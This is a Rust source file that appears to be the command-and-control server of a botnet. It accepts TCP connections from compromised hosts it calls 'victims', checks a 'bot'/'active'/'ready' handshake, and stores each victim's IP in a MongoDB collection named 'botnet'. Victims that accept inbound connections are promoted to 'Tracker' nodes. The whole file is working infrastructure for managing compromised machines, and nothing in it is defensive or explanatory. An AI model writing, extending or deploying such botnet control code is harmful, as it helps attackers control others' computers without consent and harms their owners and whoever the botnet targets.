mod tracker;

#[macro_use]
extern crate log;

use std::{net::SocketAddr, env, fmt::Display};
use tokio::{net::{TcpListener, TcpStream}, io::{BufReader, AsyncBufReadExt, AsyncWriteExt}};

use mongodb::{options::ClientOptions, Client};
use mongodb::bson::doc;
use serde::{Serialize, Deserialize};

use crate::tracker::is_victim_listening;

#[derive(Debug, Clone, Copy, Deserialize, Serialize)]
enum VictimType {
    Bot,
    Tracker
}

impl Display for VictimType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let display = match self {
            Self::Bot => "Bot",
            Self::Tracker => "Tracker"
        };
        write!(f, "{}", display)
    }
}

#[derive(Debug, Deserialize, Serialize)]
pub struct Victim {
    ip: SocketAddr,
    victim_type: VictimType
}

#[derive(Debug, Deserialize, Serialize)]
struct VictimDb {
    ip: String,
    victim_type: VictimType
}

#[tokio::main]
async fn main() {
    if env::var("RUST_LOG").is_err() {
        env::set_var("RUST_LOG", "debug")
    }
    env_logger::init();
    let listener = TcpListener::bind("192.168.0.12:9570").await.unwrap();
    let options = ClientOptions::parse("mongodb://127.0.0.1:27017/").await.unwrap();
    let client = Client::with_options(options).unwrap();

    info!("Server started");
    loop {
        let (stream, addr) = listener.accept().await.unwrap();

        info!("Connection established");
        let client = client.clone();
        tokio::spawn(async move {
            let victims_col = client.database("botnet").collection::<VictimDb>("victims");
            let victim = handle_connection(stream, &addr).await;
            if let Some(victim) = victim {
                let filter = doc! { "ip": addr.ip().to_string() };
                if !victims_col.find_one(filter, None).await.is_ok() {
                    if let Err(err) = victims_col.insert_one(VictimDb { ip: addr.ip().to_string(), victim_type: victim.victim_type }, None).await {
                        error!("Failed to insert in the database : {}", err);
                    } else {
                        info!("A new victim has been inserted in the database, ip: {}, mode: {}", addr.ip().to_string(), victim.victim_type);
                    }
                } else {
                    info!("An old victim connected to the server, ip: {} mode: {}", addr.ip().to_string(), victim.victim_type);
                }
            }
        });
    }
}

async fn handle_connection(mut stream: TcpStream, current_ip: &SocketAddr) -> Option<Victim> {
    let mut buf_reader = BufReader::new(&mut stream);
    let mut http_request: Vec<u8> = Vec::new();
    buf_reader
        .read_until(0, &mut http_request).await.unwrap();

    let http_request = std::str::from_utf8(&http_request).unwrap();
    debug!("Request bytes: {:?}", http_request.as_bytes());
    if http_request != "bot\0" {
        error!("Someone connected without sending 'bot'");
        return None;
    };
    if let Err(_) = stream.write_all("active\0".as_bytes()).await {
        return None;
    }
    debug!("ip: {}", current_ip);
    let mut victim = Victim { ip: *current_ip, victim_type: VictimType::Bot };

    let mut buf_reader = BufReader::new(stream);

    let mut buffer = Vec::new();
    buf_reader.read_until(0, &mut buffer).await.unwrap();
    let buffer = std::str::from_utf8(&buffer).unwrap();
    if buffer != "ready\0" {
        error!("The client's server responded '{}' instead of 'ready'", buffer);
        return None;
    }
    if is_victim_listening(&victim).await {
        info!("The victim: {} is listening and will become a tracker", victim.ip);
        victim.victim_type = VictimType::Tracker;
    }

    return Some(victim);
}
